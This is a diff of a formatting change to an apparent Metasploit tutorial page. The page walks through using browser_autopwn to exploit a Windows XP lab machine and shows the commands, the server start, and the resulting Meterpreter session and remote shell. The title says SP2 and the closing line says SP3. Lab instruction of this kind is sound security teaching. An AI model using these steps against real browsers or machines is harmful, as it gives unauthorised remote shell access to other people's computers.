@@ -5,15 +5,15 @@ Metasploit Browser Autopwn – Windows XP SP2
 Run msfconsole, load the browser_autopwn module and set all required options.<br>
 <code>
 <div class="code">
-<font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
-<font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set SRVPORT 80</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set URIPATH /</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>run</b><br>
+root@kali:~$ <com>msfconsole</com><br>
+msf > <com>use auxiliary/server/browser_autopwn</com><br>
+msf auxiliary(browser_autopwn) > <com>set LHOST 192.168.1.12</com><br>
+msf auxiliary(browser_autopwn) > <com>set SRVPORT 80</com><br>
+msf auxiliary(browser_autopwn) > <com>set URIPATH /</com><br>
+msf auxiliary(browser_autopwn) > <com>run</com><br>
 <br>
-<font color="silver">[*] Starting exploit modules on host 192.168.1.12...</font><br>
-<font color="silver">[*] Server started.</font>
+[*] Starting exploit modules on host 192.168.1.12...<br>
+[*] Server started.
 </div>
 </code>
 The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br>
@@ -22,27 +22,27 @@ On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
 This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
 <code>
 <div class="code">
-<font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
-<font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
-<font color="silver">...</font><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
-<font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
-<font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
-<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.</font><br>
-<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
-<font color="silver">Victim</font><br>
+[*] Meterpreter session 1 opened (192.168.1.12:7777 -> <br>
+192.168.1.13:1045) at 2015-07-25 05:08:06 -0400<br>
+...<br>
+msf auxiliary(browser_autopwn) ><com> sessions -i 1</com><br>
+[*] Starting interaction with 1...meterpreter ><com> shell</com><br>
+Microsoft Windows XP [Version 5.1.2600]<br>
+(C) Copyright 1985-2001 Microsoft Corp.<br>
+C:\Documents and Settings\IEUser\Desktop><com>echo %USERNAME%</com><br>
+Victim<br>
 <br>
-<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
-<font color="silver">Windows IP Configuration</font><br>
+C:\Documents and Settings\IEUser\Desktop><com>ipconfig</com><br>
+Windows IP Configuration<br>
 <br>
-<font color="silver">Ethernet adapter Local Area Connection:</font><br>
+Ethernet adapter Local Area Connection:<br>
 <br>
-<font color="silver">Connection-specific DNS Suffix . : Home</font><br>
-<font color="silver">IP Address. . . . . . . . . . . . : 192.168.1.13</font><br>
-<font color="silver">Subnet Mask . . . . . . . . . . . : 255.255.255.0</font><br>
-<font color="silver">Default Gateway . . . . . . . . . : 192.168.1.1</font><br>
+Connection-specific DNS Suffix . : Home<br>
+IP Address. . . . . . . . . . . . : 192.168.1.13<br>
+Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>
+Default Gateway . . . . . . . . . : 192.168.1.1<br>
 <br>
-<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><br>
+C:\Documents and Settings\IEUser\Desktop><br>
 </div>
 </code>
 You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br>
